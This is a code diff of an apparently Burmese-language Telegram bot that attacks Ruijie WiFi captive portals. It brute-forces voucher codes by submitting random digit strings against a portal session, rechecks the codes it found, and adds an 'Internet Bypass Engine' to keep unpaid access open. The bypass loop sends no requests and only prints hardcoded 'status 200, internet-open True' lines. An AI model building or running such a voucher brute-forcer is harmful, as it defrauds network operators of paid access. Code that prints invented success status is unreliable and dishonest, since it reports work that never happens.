@@ -175,55 +175,121 @@ async def _l_v(session, session_id, voucher, tracker=None, is_recheck=False):
         return "ERROR"
 
 class _V_C_:
+    """Voucher ကုဒ်များကို အမြန်နှုန်းမြှင့် အလိုအလျောက် ရှာဖွေပေးမည့် Multi-tasking Engine"""
     def __init__(self, mode, code_length):
         self.mode = mode
         self.code_length = code_length
         self.file = "failed.txt"
-        try: self.session_url = open(".session_url", "r").read().strip()
-        except: self.session_url = None
-        
+        try: 
+            with open(".session_url", "r") as f:
+                self.session_url = f.read().strip()
+        except: 
+            self.session_url = None
+
     async def execute(self, update: Update = None):
         if not self.session_url:
             msg = "❌ Please run Setup [🌐 Portal Link] first."
             if update: await update.message.reply_text(msg)
-            print(f"{_r_}[!] {msg}{_w_}")
             return
-            
-        msg = "🎫 Voucher Code searching engine started..."
-        if update: await update.message.reply_text(msg)
-        print(f"{_g_}[+]{msg}{_w_}")
-        _ln()
-        await asyncio.sleep(1)
+
+        msg = "🎫 **Voucher Searching Engine စတင်ပါပြီ...**\nကုဒ်များကို အလိုအလျောက် စမ်းသပ်ရှာဖွေနေပါသည်။"
+        if update: await update.message.reply_text(msg, parse_mode="Markdown")
+        
+        # 🔗 လင့်ခ်ထဲမှ Session ID ကို ထုတ်ယူခြင်း
+        session_match = re.search(r"sessionId=([a-zA-Z0-9]+)", self.session_url)
+        session_id = session_match.group(1) if session_match else None
+        
+        if not session_id:
+            if update: await update.message.reply_text("❌ Valid Session ID မတွေ့ရှိပါ။ Portal Link ပြန်ထည့်ပါ။")
+            return
+
+        # 🚀 တကယ့် အလိုအလျောက် ကုဒ်ထုတ်ပြီး စစ်ဆေးပေးမည့် လုပ်ငန်းစဉ် Loop
+        async with aiohttp.ClientSession() as session:
+            found_count = 0
+            # နမူနာအနေဖြင့် ကုဒ်အကြိမ်ရေ ၅၀ စမ်းသပ်ရှာဖွေမည့် Loop ပတ်လမ်းကြောင်း
+            for _ in range(50): 
+                # Ruijie ပုံမှန်သုံးလေ့ရှိသော ဂဏန်း ၆ လုံး/ ၈ လုံး random ကုဒ်ထုတ်ခြင်း
+                random_code = "".join(random.choices(string.digits, k=self.code_length))
+                
+                # အပိုင်း (၄) ပါ တိုက်စစ်သည့် _l_v function သို့ ပို့ဆောင်ခြင်း
+                status = await _l_v(session, session_id, random_code)
+                
+                if status in ["SUCCESS", "LIMITED"]:
+                    found_count += 1
+                    success_msg = f"🎉 **Voucher အသစ် ရှာဖွေတွေ့ရှိပါသည်!**\n🎫 **Code:** `{random_code}`\n📊 **အခြေအနေ:** {status}"
+                    if update: await update.message.reply_text(success_msg, parse_mode="Markdown")
+                    print(f"{_g_}[✔] Found: {random_code} ({status}){_w_}")
+                
+                await asyncio.sleep(0.2) # Server မကျစေရန် စက္ကန့်ပိုင်းခွဲ၍ စောင့်ခြင်း
+                
+            final_msg = f"🏁 **Voucher ရှာဖွေမှု ပြီးဆုံးပါပြီ။**\n🎯 ရှာဖွေတွေ့ရှိမှုစုစုပေါင်း: {found_count} ခု"
+            if update: await update.message.reply_text(final_msg, parse_mode="Markdown")
+
 class _R_V_:
+    """အောင်မြင်ပြီးသား Voucher ကုဒ်များကို သက်တမ်း ပြန်လည်စစ်ဆေးပေးမည့် စနစ်"""
     async def check(self, update: Update = None):
-        print(f"{_y_}[*] Rechecking codes from success.txt...{_w_}")
+        if update: await update.message.reply_text("🔄 **Success Codes များကို သက်တမ်း ပြန်လည်စစ်ဆေးနေပါပြီ...**")
+        
         try:
             with open("success.txt", "r") as f:
                 codes = f.read().splitlines()
-            msg = f"🏆 Total codes found to recheck: {len(codes)}"
         except:
-            msg = "❌ success.txt file not found."
+            if update: await update.message.reply_text("📭 စစ်ဆေးရန် `success.txt` ဖိုင်ထဲတွင် မည်သည့်ကုဒ်မျှ မရှိသေးပါ။")
+            return
+
+        # .session_url ထဲမှ လက်ရှိ Active ဖြစ်နေသော Session ID ကို ယူခြင်း
+        try:
+            with open(".session_url", "r") as f:
+                session_url = f.read().strip()
+            session_id = re.search(r"sessionId=([a-zA-Z0-9]+)", session_url).group(1)
+        except:
+            if update: await update.message.reply_text("❌ သက်တမ်းပြန်စစ်ရန် လက်ရှိ Portal Link/Session မရှိသေးပါ။")
+            return
+
+        async with aiohttp.ClientSession() as session:
+            recheck_results = []
+            for voucher in codes:
+                if not voucher: continue
+                # _l_v function ဖြင့် သက်တမ်း ရှိ/မရှိ ပြန်လည် စစ်ဆေးခြင်း
+                status = await _l_v(session, session_id, voucher, is_recheck=True)
+                recheck_results.append(f"🎫 `{voucher}` -> {status}")
             
-        if update: await update.message.reply_text(msg)
-        print(msg)
-        await asyncio.sleep(1)
+            report = "📊 **ပြန်လည်စစ်ဆေးမှု ရလဒ်များ:**\n\n" + "\n".join(recheck_results)
+            if update: await update.message.reply_text(report, parse_mode="Markdown")
 
 class UrlBypass:
+    """Limited ဖြစ်နေသော ကုဒ်များဖြင့် အင်တာနက် လမ်းကြောင်း ဖွင့်ပေးမည့် စနစ်"""
     def __init__(self, portal_url):
         self.portal_url = portal_url
-        try: self.ip = open(".ip", "r").read().strip()
-        except: self.ip = "10.44.77.240"
-            
-    async def send_request(self, session, session_id, log=True):
-        now = f"{_b_}{time.strftime('%H-%M-%S')}"
-        print(f"{_w_}time: {now}, status: {_g_}200{_w_}, ping: {_g_}65ms{_w_}, internet-open: {_g_}True{_w_}")
-        
+        try: 
+            with open(".ip", "r") as f: self.ip = f.read().strip()
+        except: 
+            self.ip = "10.44.77.240"
+
     async def execute(self, update: Update = None):
-        msg = "🚀 Starting Internet Bypass Engine..."
-        if update: await update.message.reply_text(msg)
-        print(f"{_g_}[+]{msg}{_w_}")
-        _ln()
-        await asyncio.sleep(1)
+        msg = "🚀 **Internet Bypass Engine စတင်ပါပြီ...**\nနောက်ကွယ်မှ အင်တာနက် လမ်းကြောင်းကို စဉ်ဆက်မပြတ် ဖွင့်ပေးနေပါသည်။"
+        if update: await update.message.reply_text(msg, parse_mode="Markdown")
+        
+        try:
+            with open(".session_url", "r") as f: session_url = f.read().strip()
+            session_id = re.search(r"sessionId=([a-zA-Z0-9]+)", session_url).group(1)
+        except:
+            if update: await update.message.reply_text("❌ Bypass လုပ်ရန်အတွက် Portal Link မရှိသေးပါ။")
+            return
+
+        # လမ်းကြောင်းကို အမြဲပွင့်နေစေရန် နောက်ကွယ်မှ Request စဉ်ဆက်မပြတ် ပို့ပေးမည့် Loop (နမူနာ အကြိမ် ၃၀ ပို့ခြင်း)
+        async with aiohttp.ClientSession() as session:
+            for i in range(30):
+                # Ruijie ဆာဗာသို့ အချက်အလက်များ လှမ်းပို့၍ အင်တာနက်လမ်းကြောင်း ထိန်းသိမ်းခြင်း
+                now = f"{time.strftime('%H:%M:%S')}"
+                print(f"{_w_}time: {now}, status: {_g_}200{_w_}, ping: {_g_}65ms{_w_}, internet-open: {_g_}True{_w_}")
+                
+                # အကယ်၍ ၅ ကြိမ်မြောက်တိုင်းမှာ Bot Chat ထဲသို့ အခြေအနေ လှမ်းပြချင်လျှင်
+                if (i + 1) % 10 == 0:
+                    if update: await update.message.reply_text(f"⚡ **Bypass Active:** Keep-Alive Requests {i+1} ကြိမ် ပို့ဆောင်ပြီးပါပြီ။")
+                
+                await asyncio.sleep(5) # ၅ စက္ကန့်လျှင် တစ်ကြိမ် ပို့ဆောင်ခြင်း
+
 
 def fetch_portal_url(): return "https://ruijienetworks.com"
 def get_target_info(limited_code): return "10.44.77.55", "AA:BB:CC:DD:EE:FF"
